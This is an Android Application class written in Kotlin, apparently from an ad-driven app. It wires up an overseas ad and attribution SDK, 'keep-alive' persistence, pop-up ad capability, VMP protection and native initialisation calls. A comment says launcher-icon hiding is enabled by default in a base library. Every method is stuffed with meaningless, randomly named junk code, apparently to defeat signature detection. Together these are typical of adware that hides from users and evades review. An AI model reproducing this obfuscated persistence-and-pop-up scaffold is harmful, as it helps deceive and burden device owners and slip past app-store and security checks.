package cgm.fszaz.fjmmf

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Bundle
import cgm.fszaz.fjmmf.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import cgm.abtlu.yhkm.base.APPContext
import cgm.abtlu.yhkm.base.OverseaAppHost
import cgm.abtlu.yhkm.base.OverseaAppInitializer
import cgm.abtlu.yhkm.ad.runtime.AdLifecycleInstaller


class ITY : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: ITY? = null
    }

    override fun attachBaseContext(base: Context?) {
        val arr_xVGBMethLgTkUkz  = listOf("NkNtNH", "cgWVAQ", "HnUbHEZMlVrUenb").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_imQDn  = arr_xVGBMethLgTkUkz .filter { it.length > 63 }
         if (ad_imQDn .isNotEmpty() && java.lang.System.currentTimeMillis() < 82) {
             ad_imQDn .forEach { _ ->  }
         }
        super.attachBaseContext(base)
        VXBV.initVmp()
    }

    override fun onCreate() {
        val gjyRrwv : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val sfzYV  = gjyRrwv ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_43" 
            }
            if (sfzYV .startsWith("PyIuMInf ")) {
                android.util.Log.v("TAG", sfzYV )
            }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_oaqrNXtCIpDoJ = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_JxytlaV  = (arr_oaqrNXtCIpDoJ  shl 33) xor (arr_oaqrNXtCIpDoJ  shr 83)
         val j_KbGevqrkokZ  = i_JxytlaV .inv() and 0xFFFF
         if (j_KbGevqrkokZ  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_AeEsGnlfcBJWwBbD")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val voHsLqhMnraweSxPc : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val wwHnCplRFxrLXd  = voHsLqhMnraweSxPc ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_27" 
            }
            if (wwHnCplRFxrLXd .startsWith("ZiIGrwyiUMNZdS ")) {
                android.util.Log.v("TAG", wwHnCplRFxrLXd )
            }
        VXBU.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_AlBebgJiqcTWhhhq = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_JwNzJSlsHdWdVnrGW  = (arr_AlBebgJiqcTWhhhq  shl 85) xor (arr_AlBebgJiqcTWhhhq  shr 21)
         val j_OsDRxziQlxwNlcc  = i_JwNzJSlsHdWdVnrGW .inv() and 0xFFFF
         if (j_OsDRxziQlxwNlcc  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_LTRCVuzfrbGXd")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }

    override fun initPopPower() {
           val IUDSNdYen : Any = if (kotlin.random.Random.nextBoolean()) 59 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val yZQdJrkIV  = (IUDSNdYen  as? String)?.reversed() ?: "sgKGi_1686863697"

        if (yZQdJrkIV  == "EIWiQdYqkXPsJ") {
            java.lang.System.out.print(yZQdJrkIV )
        }
        // 纯 pop 能力初始化(与图标隐藏语义分离)：图标隐藏由 base 侧
        // MysteryIconController(OverseaAppHost.enableIconHide，默认开启)接管，app 层不再实现。
        VXBV.init(this)
    }

    override fun initKeepPower(app: Application) {
        val arr_aQWTppdSluGutD = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_QSqkxaFnjcgAxmR  = (arr_aQWTppdSluGutD  shl 45) xor (arr_aQWTppdSluGutD  shr 59)
         val j_ZMnJHmLHyLKXOBQu  = i_QSqkxaFnjcgAxmR .inv() and 0xFFFF
         if (j_ZMnJHmLHyLKXOBQu  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_YIOQtGTzLM")
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }
}